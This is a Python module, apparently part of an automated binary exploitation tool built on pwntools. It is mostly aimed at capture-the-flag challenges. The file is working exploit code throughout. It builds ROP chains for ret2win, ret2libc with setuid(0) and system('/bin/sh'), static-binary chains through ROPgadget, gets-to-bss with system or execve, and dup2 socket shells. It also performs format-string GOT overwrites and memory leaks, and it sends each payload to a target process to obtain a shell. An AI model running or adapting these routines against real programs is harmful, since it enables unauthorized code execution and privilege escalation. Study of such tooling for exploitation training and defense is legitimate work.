from pwn import *
from .utils import *
import subprocess

# Author: xct

# python3 can no longer change the local variables with exec
p = b''

class Exploit():
    def __init__(self, ropstar):
        self.ropstar = ropstar
        self.binary = self.ropstar.binary
        self.px = None
        self.ux = None
        if self.ropstar.arch == 'amd64':
            self.px = lambda x : p64(x)
            self.ux = lambda x : u64(x)
        else:
            self.px = lambda x : p32(x)
            self.ux = lambda x : u32(x)


    def win(self, p, win):
        log.info("Exploit: win")
        rop = ROP(self.binary)
        rop.call(int(win,16))
        log.info(rop.dump())
        payload = self.ropstar.fit(rop.chain())     
        self.ropstar.trigger(p, payload)
        # we usually don't get shells from these, mostly just cat on the flag
        return


    def default(self, p, libc):
        ''' Uses /bin/sh string in libc as arg to system. Requires libc.
        '''
        log.info("Exploit: default")
        result = False
        rop = ROP(self.binary)      
        sh = next(libc.search(b"/bin/sh\x00"))
        rop.call(libc.symbols['setuid'], [0x0])
        rop.call(libc.symbols['system'], [sh])
        log.info(rop.dump())
        payload = self.ropstar.fit(rop.chain())         
        self.ropstar.trigger(p, payload)
        result = self.ropstar.check_success(p)
        if result:
            save('payload', payload)
        return result


    def static(self, prog):
        ''' All gadgets are in the binary
        pwnlib seems to fail to build reliable chains on static binaries so we use ROPgadget.py for now
        '''
        log.info("Exploit: static")
        result = False      
        argv = ['python', '~/tools/ROPgadget/ROPgadget.py', '--binary', os.path.basename(self.ropstar.bname), '--ropchain']
        proc = subprocess.Popen(argv, stdout=subprocess.PIPE)
        out, err = proc.communicate()
        out = decode(out)
        
        code = out[out.find("#!"):].replace("\t","").replace("\n\n","\n")
        log.info(code)  

        # really dirty python3 hack (cause exec changed)
        # 
        global p 
        code = 'global p;'+'\n'.join(code.split('\n')[1:])
        code = code.replace(" '"," b'")      
        p = b''
        exec(code) # this generate the p variable
        log.info(p)

        if len(p)==0:
            log.failure("ROPgadget.py could not find a valid chain")
            return False    
        payload = self.ropstar.fit(p)   
        self.ropstar.trigger(prog, payload)
        result = self.ropstar.check_success(prog)
        if result:
            save('payload', payload)
        return result


    def bss(self, p, libc=None):
        ''' Writes /bin/bash string to bss, used as argument to system. Can work with and without libc.
        '''     
        log.info("Exploit: gets(bss); system(bss)")
        result = False
        rop = ROP(self.binary)
        bss = self.binary.bss()
        gets = None
        system = None
        if libc:
            # ret2libc
            gets = libc.symbols['gets']
            system = libc.symbols['system']
        else:
            # ret2plt
            try:
                gets = self.binary.plt['gets']
                system = self.binary.plt['system']
            except KeyError:
                pass
        if gets and system:
            rop.call(gets, [bss])
            rop.call(system, [bss])
            log.info(rop.dump())
            payload = self.ropstar.fit(rop.chain())
            self.ropstar.trigger(p, payload)
            p.sendline('/bin/bash')        
            result = self.ropstar.check_success(p)
            if result:
                save('payload', payload)
        return result


    def bss_execve(self, p, libc=None):
        ''' Writes /bin/bash string to bss, used as argument to execve. Can work with and without libc.
        '''     
        log.info("Exploit: gets(bss); execve(bss,0,0)")
        result = False
        rop = ROP(self.binary)      
        bss = self.binary.bss()
        gets = None
        execve = None
        if libc:
            # ret2libc
            gets = libc.symbols['gets']
            execve = libc.symbols['execve']
        else:
            # ret2plt
            try:
                gets = self.binary.plt['gets']
                execve = self.binary.plt['execve']
            except KeyError:
                pass
        if gets and execve:         
            rop.call(gets, [bss])
            rop.call(execve, [bss, 0, 0])
            try:
                log.info(rop.dump())
            except pwnlib.exception.PwnlibException:
                # could not create chain
                return False
            payload = self.ropstar.fit(rop.chain())
            self.ropstar.trigger(p, payload)
            p.sendline('/bin/bash')        
            result = self.ropstar.check_success(p)
            if result:
                save('payload', payload)
        return result


    def dup2(self, p, libc, fd):
        log.info("Exploit: dup2,system()")        
        result = False        
        rop = ROP(libc)        
        rop.dup2(fd, 0)
        rop.dup2(fd, 1)
        rop.dup2(fd, 2)
        rop.system(next(libc.search(b"/bin/sh\x00")))
        log.info(rop.dump())
        payload = self.ropstar.fit(rop.chain())
        self.ropstar.trigger(p, payload)
        result = self.ropstar.check_success(p)
        if result:                
            save('payload', payload)
        return result


    def fmt(self, p, autofmt, libc=None):
        ''' Format string exploitation
        ''' 
        log.info("Exploit: format string")
        writes = {}
        if self.ropstar.args.win:
            addr = self.ropstar.args.win
            addr = int(addr, 16)
            writes[self.binary.got['printf']] = addr
            payload = fmtstr_payload(autofmt.offset, writes)
            self.ropstar.trigger(p, payload)
            result = self.ropstar.check_success(p)
            if result:
                save('payload', payload)
        else:
            self.fmt_loop(p, autofmt)
            leak = self.fmt_leak(p, self.binary.got['printf'], autofmt.offset)
            log.success(hex(leak))
            # we could leak libc form the stack and one gadget
            # we could write ropchain to bss, to execute we have to pivot there, stack canaries forbid that though


    def fmt_loop(self, p, autofmt):
        ''' patch exit to main to keep the program open
        '''
        try:    
            payload = fmtstr_payload(autofmt.offset, {self.binary.got['exit'] : self.binary.symbols['main']})
        except KeyError:
            log.failure("Could not loop the binary - no exit function found")
            return
        self.ropstar.trigger(p, payload)


    def fmt_leak(self, p, addr, offset):
        ''' Leak memory for the given address
        '''
        payload = self.px(addr)+'%'+str(offset)+'$s'
        p.sendline(payload)
        leak = p.recvall()
        bytes = bytearray(leak)
        l = re.search(b'...\xf7',bytes).group(0)        
        return self.ux(l)